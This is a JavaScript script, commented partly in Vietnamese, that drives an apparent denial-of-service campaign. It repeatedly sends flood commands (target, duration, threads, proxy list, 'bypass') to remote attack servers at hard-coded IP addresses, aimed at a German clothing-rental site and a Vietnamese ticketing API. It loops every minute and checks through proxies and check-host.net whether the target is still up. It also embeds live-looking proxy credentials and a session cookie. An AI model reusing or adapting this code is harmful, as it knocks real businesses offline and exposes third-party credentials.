import fetch from "node-fetch";
import axios from "axios";
import {HttpsProxyAgent} from "https-proxy-agent";
import * as cheerio from "cheerio";

let proxy_file = './lst-proxy/proxy_2.txt';//500.txt
let type = 1;
let index = 4;
let time = 30;
let threads = 15;
let rate_limit = 1;
async function attack(host){
    let arr = [20, 25, 30, 35, 27];
    arr = [30, 35, 33, 40, 34];
    // arr = [50, 60, 70, 80, 90];
    // const arr = [10, 15, 20, 17, 19];
    // const arr = [20, 21, 22, 23, 24];
// random index từ 0 -> arr.length - 1
    time = 60;//arr[Math.floor(Math.random() * arr.length)];
    // proxy_file = 'proxy_'+index+'.txt';
    if (type === 1) {
        proxy_file = './lst-proxy/proxy_'+index+'.txt';
    }
    proxy_file = './5000.txt';
/*    else {
        console.log('Go here')
        proxy_file = 'proxy1.txt';
        index = 0
    }*/
    console.log(proxy_file)
    const myHeaders = new Headers();
    myHeaders.append("user-agent", "sdasds2");
    myHeaders.append("Content-Type", "application/json");
    if (!host) {
        host = "https://bavarian-outfitters.de/"
    }
    const raw = JSON.stringify({
        "target": host,
        "time": time,
        "threads": threads,
        "proxyfile": proxy_file,
        "ratelimit": rate_limit,
        "debug": true,
        "bypass": true,
        "reset": true
    });

    const requestOptions = {
        method: "POST",
        headers: myHeaders,
        body: raw,
        redirect: "follow"
    };

    try {
        const response = await fetch("http://34.124.178.25:5000/run", requestOptions);
        const result = await response.text();
        index++;
        // if (type === 2) {
        //     index = 1;
        //     type = 1;
        // }
        if (index > 6) {
            index = 1;
            // type = 2;
        }
        console.log(result)
    } catch (error) {
        console.error(error);
    };
}

async function attackStatic(host){
    // proxy_file = 'proxy_'+index+'.txt';
    let proxy_now = 'proxyscrape_germany.txt';
    console.log(proxy_now)
    const myHeaders = new Headers();
    myHeaders.append("user-agent", "sdasds2");
    myHeaders.append("Content-Type", "application/json");
    if (!host) {
        host = "https://bavarian-outfitters.de/"
    }
    const raw = JSON.stringify({
        "target": host,
        "time": 20,
        "threads": 15,
        "proxyfile": proxy_now,
        "ratelimit": 2,
        "debug": true,
        "bypass": true,
        "reset": true
    });

    const requestOptions = {
        method: "POST",
        headers: myHeaders,
        body: raw,
        redirect: "follow"
    };

    try {
        const response = await fetch("http://35.246.139.71:5000/run", requestOptions);
        const result = await response.text();
        console.log(result)
    } catch (error) {
        console.error(error);
    };
}

async function checkStatus1() {
    let resp = await fetch("https://bavarian-outfitters.de/lederhosenverleih-preise/", {
        "headers": {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "vi,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6",
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "referrer": "https://bavarian-outfitters.de/",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "include"
    });
    // console.log(r1.status)
    console.log(resp.status)
    return resp.status;
}
async function checkStatus() {
    let resp = {
        status: 0
    };
    try {
        const rawProxy = "proxy.oculus-proxy.com:31112:oc-90483babe0a6fe0e2001110d756b048986b715c4a21f35d51ed477b5f457baed-country-XX-session-###:gtnrco6st7xh";
        const [host, port, user, pass] = rawProxy.split(":");
        const username = encodeURIComponent(user);
        const password = encodeURIComponent(pass);
        const proxyUrl = `http://${username}:${password}@${host}:${port}`;
        // console.log("Using proxy:", proxyUrl);
        const agent = new HttpsProxyAgent(proxyUrl);
        resp = await axios.get("https://bavarian-outfitters.de/lederhosenverleih-preise/", {
            httpsAgent: agent,
            headers: {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "vi,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
            },
            timeout: 10000, // 10s
        });
        // console.log(resp.status)
        return resp.status;
    } catch (err) {
        console.error("Proxy lỗi:");
    }
    return resp.status;
}

async function getReportId() {
    const myHeaders = new Headers();
    myHeaders.append("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
    myHeaders.append("accept-language", "vi,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6");
    myHeaders.append("cache-control", "no-cache");
    myHeaders.append("pragma", "no-cache");
    myHeaders.append("priority", "u=0, i");
    myHeaders.append("referer", "https://check-host.net/check-http");
    myHeaders.append("sec-ch-ua", "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"");
    myHeaders.append("sec-ch-ua-mobile", "?0");
    myHeaders.append("sec-ch-ua-platform", "\"Windows\"");
    myHeaders.append("sec-fetch-dest", "document");
    myHeaders.append("sec-fetch-mode", "navigate");
    myHeaders.append("sec-fetch-site", "same-origin");
    myHeaders.append("sec-fetch-user", "?1");
    myHeaders.append("upgrade-insecure-requests", "1");
    myHeaders.append("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36");
    myHeaders.append("Cookie", "csrf_token=f5118932089dc6b55693435c4dd73935db078412");

    const requestOptions = {
        method: "GET",
        headers: myHeaders,
        redirect: "follow"
    };

    try {
        const response = await fetch("https://check-host.net/check-http?host=https://bavarian-outfitters.de/", requestOptions);
        const result = await response.text();
        const $ = cheerio.load(result);

        // Tìm phần tử có id="report_permalink"
        const reportDiv = $("#report_permalink");

        // Từ trong div đó, tìm <a> đầu tiên và lấy href
        return reportDiv.find("a").first().attr("href");
    } catch (error) {
        console.error(error);
    };
    return null;
}
async function getStatusReport(url){
    if (!url) {
        console.log("url undefined")
        return 0;
    }
    // url = "https://check-host.net" + url;
    let link = 'https://check-host.net/check-result/'+url.split('/').pop();
    console.log(link)
    const myHeaders = new Headers();
    myHeaders.append("Accept", "application/json");
    myHeaders.append("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36");

    const requestOptions = {
        method: "GET",
        headers: myHeaders,
        redirect: "follow"
    };

    try {
        const response = await fetch(link, requestOptions);
        const result = await response.json();
        // console.log(result)
        for (let key in result) {
            // console.log(key, result[key]);
            if (result[key]){
                try {
                    console.log(result[key][0][2])
                    if (result[key][0][2] === "OK") {
                        return 200;
                    }
                }catch (e) {
                    
                }
            }
        }
        return 0;
    } catch (error) {
        console.error(error);
    };
}
async function run(host){
    const now = new Date();
/*    if (now.getHours() === 2) {
        console.log("Đúng 3 giờ sáng");
        return
    } else {
        console.log(now.getHours() + ' Giờ');
    }*/
    let resp = await attack(host);
    // let resp = await attackStatic(host);
    let timeOut = 1000 * 60;
    let remaining = timeOut;

    function updateTimer() {
        let minutes = Math.floor(remaining / 1000 / 60);
        let seconds = Math.floor((remaining / 1000) % 60);

        // format mm:ss
        let display =
            String(minutes).padStart(2, "0") + ":" +
            String(seconds).padStart(2, "0");

        console.log(display)

        if (remaining <= 0) {
            clearInterval(countdown);
            // alert("Hết giờ!");
        }

        remaining -= 1000;
    }

    // gọi ngay lần đầu để hiển thị
    updateTimer();
    // sau đó mỗi giây cập nhật lại
    let countdown = setInterval(updateTimer, 1000);
    setTimeout(async function(){//sau 20s kiem tra trang thai
        // let invl = setInterval(async function(){
        //
        // })
        let startTime = 0;
        run(host);
        /*let inl = setInterval(async ()=>{
            try {
                let url = await getReportId();
                let status = await getStatusReport(url);
                console.log(status)
                if(status === 200 || status === 403){
                    console.log("success");
                    clearInterval(inl);
                    setTimeout(async function(){
                        run();
                    }, 40000)
                    /!*if (startTime === 0) {
                        startTime = new Date().getTime();
                    }
                    let endTime = new Date().getTime();
                    const timeOut = 1000 * 60;
                    if (endTime - startTime > timeOut) {//song qua 1p thi se call back
                        clearInterval(inl);
                        run();
                    }*!/
                }else{
                    console.log("fail")
                }
            }catch (e) {
                console.log(e)
            }
        }, 5000)*/
    }, timeOut)//20000+60000
}
function msUntilNext(hour, minute = 0) {
    const now = new Date();
    const target = new Date(now);
    target.setHours(hour, minute, 0, 0);
    if (target <= now) target.setDate(target.getDate() + 1);
    return target - now;
}
let host = 'https://api-v2.ticketbox.vn/gin/api/v2/events/25528';
run(host)
// attack(host);
// const delay = msUntilNext(13, 0); // 13:00
// console.log(`Sẽ chạy sau ${Math.round(delay/1000)} giây (lúc 13:00).`);
// // let t = 1000 * 60 * 2;
// setTimeout(() => run(host), delay);

// let interval = setInterval(async function(){
//     connect();
// }, 1000 * 15)